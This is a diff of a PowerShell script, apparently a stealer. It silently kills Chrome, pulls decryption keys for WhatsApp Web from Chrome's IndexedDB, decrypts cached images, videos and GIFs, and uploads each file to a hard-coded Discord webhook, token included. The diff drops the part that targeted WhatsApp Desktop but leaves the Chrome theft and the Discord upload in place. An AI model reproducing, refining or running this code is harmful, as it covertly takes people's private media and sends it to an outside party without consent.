@@ -9,18 +9,16 @@ $WEBHOOK = "https://discord.com/api/webhooks/1570512670191259728/JC1qDGSQ9UUmawR
 $ScriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
 if (-not $ScriptDir) { $ScriptDir = (Get-Location).Path }
 
-# -- 1. Kill Chrome + WhatsApp Desktop --
-foreach ($n in @("chrome","chromedriver","WhatsApp","WhatsAppDesktop","WhatsAppBeta")) {
+# -- 1. Kill Chrome (silent) --
+foreach ($n in @("chrome","chromedriver")) {
     $p = Get-Process -Name $n -ErrorAction SilentlyContinue
     if ($p) { $p | ForEach-Object { try { $_.Kill() } catch {} } }
 }
 Start-Sleep -Seconds 5
-foreach ($n in @("chrome","WhatsApp")) {
-    if (Get-Process -Name $n -ErrorAction SilentlyContinue) {
-        Stop-Process -Name $n -Force -ErrorAction SilentlyContinue
-    }
+if (Get-Process -Name chrome -ErrorAction SilentlyContinue) {
+    Stop-Process -Name chrome -Force -ErrorAction SilentlyContinue
+    Start-Sleep -Seconds 3
 }
-Start-Sleep -Seconds 3
 
 # -- 2. Find Chrome profiles --
 $chromeRoots = @()
@@ -30,34 +28,12 @@ if (Test-Path $baseRoot) {
         if ($_.Name -match '^(Default|Profile \d+|Guest Profile)$') { $chromeRoots += $_.FullName }
     }
 }
+if ($chromeRoots.Count -eq 0) { Write-Host "Finished"; exit 1 }
 
-# -- 3. Find WhatsApp Desktop folders --
-$waDesktopRoots = @()
-
-# Microsoft Store version (matches any publisher hash)
-$pkgRoot = "$env:LOCALAPPDATA\Packages"
-if (Test-Path $pkgRoot) {
-    Get-ChildItem $pkgRoot -Directory -ErrorAction SilentlyContinue | ForEach-Object {
-        if ($_.Name -match 'WhatsApp') {
-            $ls = Join-Path $_.FullName "LocalState"
-            if (Test-Path $ls) { $waDesktopRoots += $ls }
-        }
-    }
-}
-
-# Classic installer version
-$appDataWA = "$env:APPDATA\WhatsApp"
-if (Test-Path $appDataWA) { $waDesktopRoots += $appDataWA }
-
-$localWA = "$env:LOCALAPPDATA\WhatsApp"
-if (Test-Path $localWA) { $waDesktopRoots += $localWA }
-
-# -- 4. Build search paths --
+# -- 3. Build search list --
 $searchPaths = @()
 $waDbDirs = @()
 $waBlobDirs = @()
-$waDesktopDirs = @()
-
 foreach ($root in $chromeRoots) {
     $db = Join-Path $root "IndexedDB\https_web.whatsapp.com_0.indexeddb.leveldb"
     if (Test-Path $db) { $waDbDirs += $db; $searchPaths += $db }
@@ -68,15 +44,9 @@ foreach ($root in $chromeRoots) {
     if (Test-Path $sw1) { $searchPaths += $sw1 }
     if (Test-Path $sw2) { $searchPaths += $sw2 }
 }
-
-foreach ($root in $waDesktopRoots) {
-    $waDesktopDirs += $root
-    $searchPaths += $root
-}
-
 $searchPaths = $searchPaths | Select-Object -Unique
 
-# -- 5. Output folders --
+# -- 4. Output folders --
 $OutDir = Join-Path $ScriptDir ("recovered_wa_media_" + $OutSuffix)
 $dirImages = Join-Path $OutDir "images"
 $dirVideos = Join-Path $OutDir "videos"
@@ -287,7 +257,7 @@ public class WaHelper {
 }
 "@
 
-# -- 6. Extract keys from Chrome leveldb --
+# -- 5. Extract keys (silent) --
 $keys = @(); $seen = @{}
 foreach ($dbDir in $waDbDirs) {
     $logFiles = @(Get-ChildItem $dbDir -Filter "*.log" -File -ErrorAction SilentlyContinue)
@@ -302,50 +272,28 @@ foreach ($dbDir in $waDbDirs) {
     }
 }
 
-# -- 7. Extract keys from WhatsApp Desktop DB --
-foreach ($dRoot in $waDesktopDirs) {
-    $dbFiles = @(Get-ChildItem $dRoot -Recurse -File -ErrorAction SilentlyContinue | Where-Object {
-        $_.Name -match '\.(db|sqlite|db-wal|db-shm)$' -or $_.Name -match '^msgstore|^axolotl'
-    })
-    foreach ($f in $dbFiles) {
-        try {
-            $found = [WaHelper]::ExtractKeys($f.FullName)
-            foreach ($k in $found) {
-                $h = [BitConverter]::ToString($k)
-                if (-not $seen.ContainsKey($h)) { $seen[$h]=$true; $keys += ,$k }
-            }
-        } catch {}
-    }
-}
-
-# -- 8. Scan all locations (silent) --
+# -- 6. Scan locations (silent) --
 foreach ($sp in $searchPaths) {
-    $isBlobDir  = $waBlobDirs    -contains $sp
-    $isChromeDb = $waDbDirs      -contains $sp
-    $isDesktop  = $waDesktopDirs -contains $sp
-
-    $maxSize = if ($isDesktop) { 50MB } else { 20MB }
-    $files = @(Get-ChildItem $sp -Recurse -File -ErrorAction SilentlyContinue | Where-Object {
-        $_.Length -gt 100 -and $_.Length -lt $maxSize
-    })
+    $files = @(Get-ChildItem $sp -Recurse -File -ErrorAction SilentlyContinue | Where-Object { $_.Length -gt 100 -and $_.Length -lt 20MB })
     if ($files.Count -eq 0) { continue }
 
+    $isDbDir   = $waDbDirs   -contains $sp
+    $isBlobDir = $waBlobDirs -contains $sp
     foreach ($f in $files) {
         try {
-            $tryDecrypt = ($isChromeDb -or $isBlobDir -or $isDesktop)
-            $null = [WaHelper]::ScanFileForMedia($f.FullName, $dirImages, $dirVideos, $dirGifs, $tryDecrypt, [System.Collections.Generic.List[byte[]]]$keys, $isBlobDir)
+            $null = [WaHelper]::ScanFileForMedia($f.FullName, $dirImages, $dirVideos, $dirGifs, ($isDbDir -or $isBlobDir), [System.Collections.Generic.List[byte[]]]$keys, $isBlobDir)
         } catch {}
     }
 }
 
-# -- 9. Cleanup empty dirs --
+# -- 7. Cleanup empty dirs --
 foreach ($d in @($dirImages,$dirVideos,$dirGifs)) {
     if ((Get-ChildItem $d -File -ErrorAction SilentlyContinue).Count -eq 0) {
         Remove-Item $d -Force -ErrorAction SilentlyContinue
     }
 }
 
-# -- 10. Send each file individually to Discord (silent) --
+# -- 8. Send each file individually to Discord (silent) --
 $all = @(Get-ChildItem $OutDir -Recurse -File -ErrorAction SilentlyContinue)
 
 foreach ($file in $all) {
